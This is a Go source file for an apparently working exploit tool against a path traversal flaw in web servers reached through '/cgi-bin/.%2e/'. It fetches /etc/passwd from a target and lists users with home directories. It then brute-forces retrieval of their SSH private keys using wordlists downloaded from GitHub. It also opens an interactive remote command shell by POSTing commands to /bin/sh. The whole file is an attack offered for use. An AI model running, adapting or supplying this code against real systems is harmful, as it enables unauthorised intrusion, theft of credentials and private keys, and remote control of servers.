package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
)

func main() {
	// Defining our arguments
	ipAddress := flag.String("i", "", "Target IP address (e.g., 10.0.0.1:4731 or 10.0.0.1)")
	sshLength := flag.Int("l", 0, "SSH-key wordlist size (0: small, 1: medium, 2: large)")
	useSSL := flag.Bool("ssl", false, "Enable SSL (default: false)")
	keyWordlist := flag.String("k", "", "Optional: Custom wordlist for SSH keys")
	getRCEarguments := flag.Bool("rce", false, "Enable remote code execution")
	flag.Parse()

	// If you want to use SSL
	sslType := getProtocol(*useSSL)
	fmt.Println("Starting the program...")
	fmt.Printf("IP Address: %s\nSSL Type: %s\n", *ipAddress, sslType)

	// If getRCEarguments flag is used
	if *getRCEarguments {
		handleRCE(*ipAddress, sslType)
	} else {
		handleSSHBruteforce(*ipAddress, sslType, *sshLength, *keyWordlist)
	}

	fmt.Println("Program finished.")
}

// Specifies the url format
func getProtocol(useSSL bool) string {
	if useSSL {
		return "https://"
	}
	return "http://"
}

// Does some logic for the SSH bruteforce
func handleSSHBruteforce(ipAddress, sslType string, sshLength int, keyWordlist string) {
	sshKeys, err := loadSSHKeys(sshLength, keyWordlist)
	if err != nil {
		fmt.Printf("Error loading SSH keys: %s\n", err)
		os.Exit(1)
	}
	fmt.Println("SSH keys loaded.")

	users, err := fetchUsersFromPasswd(ipAddress, sslType)
	if err != nil {
		fmt.Printf("Error fetching users: %s\n", err)
		os.Exit(1)
	}

	bruteForceSSH(sshKeys, users, ipAddress, sslType)
}

// Obtains the users from /etc/passwd file
func fetchUsersFromPasswd(ipAddress, sslType string) ([]string, error) {
	// define the payload
	// NOTE: if format does not work for you, manually change it.
	payload := sslType + ipAddress + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
	fmt.Println("Fetching /etc/passwd with payload:", payload)

	resp, err := http.Get(payload)
	if err != nil {
		return nil, fmt.Errorf("HTTP request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	users := parseUsersFromPasswd(string(body))
	if len(users) == 0 {
		return nil, fmt.Errorf("no users found in /etc/passwd")
	}

	fmt.Println("[+] Users found:", users)
	return users, nil
}

// Parses users with home directories from /etc/passwd content
func parseUsersFromPasswd(passwdContent string) []string {
	lines := strings.Split(passwdContent, "\n")
	var users []string

	// NOTE: it only checks users which have `/home` in `/etc/passwd` specified.
	for _, line := range lines {
		if strings.Contains(line, "/home") {
			parts := strings.Split(line, ":")
			if len(parts) > 0 {
				users = append(users, parts[0])
			}
		}
	}
	return users
}

// Brute-forces SSH keys for the obtained users
func bruteForceSSH(sshKeys, users []string, ipAddress, sslType string) {
	// Manually construct the base payload
	payloadBase := sslType + ipAddress + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
	fmt.Println("Starting SSH brute force...")

	var wg sync.WaitGroup
	for _, user := range users {
		for _, key := range sshKeys {
			wg.Add(1)
			go func(user, key string) {
				defer wg.Done()
				checkSSHKey(payloadBase, user, key)
			}(user, key)
		}
	}
	wg.Wait()
	fmt.Println("SSH brute force completed.")
}

// Checks if an SSH key exists for a user
func checkSSHKey(payloadBase, user, key string) {
	// Manually construct the full URL
	path := fmt.Sprintf("/home/%s/.ssh/%s", user, key)
	fullURL := payloadBase + path

	resp, err := http.Get(fullURL)
	if err != nil {
		fmt.Printf("Error checking SSH key for user %s: %s\n", user, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		fmt.Printf("\n[+] Found SSH key for user %s: %s\n", user, fullURL)
		body, _ := io.ReadAll(resp.Body)
		fmt.Println(string(body))
	}
}

// Loads SSH keys from a pre-defined wordlist.
func loadSSHKeys(size int, customWordlist string) ([]string, error) {
	if customWordlist != "" {
		return loadFileLines(customWordlist)
	}

	// If URLS become invalid, please change these.
	urls := map[int]string{
		0: "https://raw.githubusercontent.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists/main/ssh-priv-key-loot-common.txt",
		1: "https://raw.githubusercontent.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists/main/ssh-priv-key-loot-medium.txt",
		2: "https://raw.githubusercontent.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists/main/ssh-priv-key-loot-extended.txt",
	}

	resp, err := http.Get(urls[size])
	if err != nil {
		return nil, fmt.Errorf("failed to fetch SSH keys: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read SSH keys: %w", err)
	}

	return strings.Split(string(body), "\n"), nil
}

// Loads the wordlist if you make use of the -k flag.
func loadFileLines(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading file: %w", err)
	}

	return lines, nil
}

// Handler for the RCE
func handleRCE(ipAddress, sslType string) {
	reader := bufio.NewReader(os.Stdin)
	payload := sslType + ipAddress + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"

	fmt.Println("\nEnter commands to execute (type 'exit' to quit):")
	for {
		fmt.Print("Command: ")
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "exit" {
			fmt.Println("Exiting RCE...")
			break
		}

		executeRCE(payload, command)
	}
}

// Executes a command via the data request, which contains the command specified.
func executeRCE(payload, command string) {
	req, err := http.NewRequest("POST", payload, strings.NewReader("A=|echo;"+command))
	if err != nil {
		fmt.Printf("Error creating request: %s\n", err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error executing request: %s\n", err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %s\n", err)
		return
	}

	fmt.Println("Response:", string(body))
}
